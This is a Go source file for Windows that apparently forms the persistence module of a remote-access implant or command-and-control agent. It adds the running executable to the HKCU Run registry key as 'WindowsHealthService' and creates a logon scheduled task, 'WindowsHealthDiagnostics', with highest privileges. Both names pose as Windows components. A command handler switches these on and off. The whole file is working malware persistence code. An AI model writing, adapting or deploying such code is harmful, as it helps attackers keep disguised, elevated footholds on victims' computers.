//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

var (
	advapi32       = syscall.NewLazyDLL("advapi32.dll")
	pRegOpenKeyExW = advapi32.NewProc("RegOpenKeyExW")
	pRegSetValueExW = advapi32.NewProc("RegSetValueExW")
	pRegDeleteValueW = advapi32.NewProc("RegDeleteValueW")
	pRegCloseKey   = advapi32.NewProc("RegCloseKey")
)

const (
	HKEY_CURRENT_USER  = 0x80000001
	KEY_WRITE          = 0x20006
	REG_SZ             = 1
)

func persistRegistry(remove bool) string {
	exe, err := os.Executable()
	if err != nil {
		return "Error: " + err.Error()
	}

	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	valueName, _ := syscall.UTF16PtrFromString("WindowsHealthService")

	var hKey syscall.Handle
	ret, _, _ := pRegOpenKeyExW.Call(
		uintptr(HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(subKey)),
		0,
		uintptr(KEY_WRITE),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		return fmt.Sprintf("Error: RegOpenKeyEx failed (0x%x)", ret)
	}
	defer pRegCloseKey.Call(uintptr(hKey))

	if remove {
		ret, _, _ = pRegDeleteValueW.Call(
			uintptr(hKey),
			uintptr(unsafe.Pointer(valueName)),
		)
		if ret != 0 {
			return fmt.Sprintf("Error: RegDeleteValue failed (0x%x)", ret)
		}
		return "Registry run key removed"
	}

	valueData, _ := syscall.UTF16FromString(exe)
	dataSize := uint32(len(valueData) * 2)
	ret, _, _ = pRegSetValueExW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(REG_SZ),
		uintptr(unsafe.Pointer(&valueData[0])),
		uintptr(dataSize),
	)
	if ret != 0 {
		return fmt.Sprintf("Error: RegSetValueEx failed (0x%x)", ret)
	}
	return fmt.Sprintf("Registry run key set: HKCU\\...\\Run\\WindowsHealthService -> %s", exe)
}

func persistScheduledTask(remove bool) string {
	taskName := "WindowsHealthDiagnostics"

	if remove {
		out, err := exec.Command("schtasks", "/Delete", "/TN", taskName, "/F").CombinedOutput()
		if err != nil {
			return "Error: " + strings.TrimSpace(string(out))
		}
		return "Scheduled task removed: " + taskName
	}

	exe, err := os.Executable()
	if err != nil {
		return "Error: " + err.Error()
	}

	out, err := exec.Command("schtasks", "/Create",
		"/TN", taskName,
		"/TR", exe,
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F",
	).CombinedOutput()
	if err != nil {
		return "Error: " + strings.TrimSpace(string(out))
	}
	return fmt.Sprintf("Scheduled task created: %s (ONLOGON, HIGHEST)", taskName)
}

func handlePersist(args string) string {
	parts := strings.Fields(args)
	if len(parts) == 0 {
		return persistRegistry(false)
	}

	method := strings.ToLower(parts[0])
	remove := len(parts) > 1 && strings.ToLower(parts[1]) == "remove"

	switch method {
	case "registry", "reg":
		return persistRegistry(remove)
	case "schtask", "task":
		return persistScheduledTask(remove)
	case "remove", "clean":
		reg := persistRegistry(true)
		task := persistScheduledTask(true)
		return reg + "\n" + task
	default:
		return "Usage: persist [registry|schtask|remove]"
	}
}
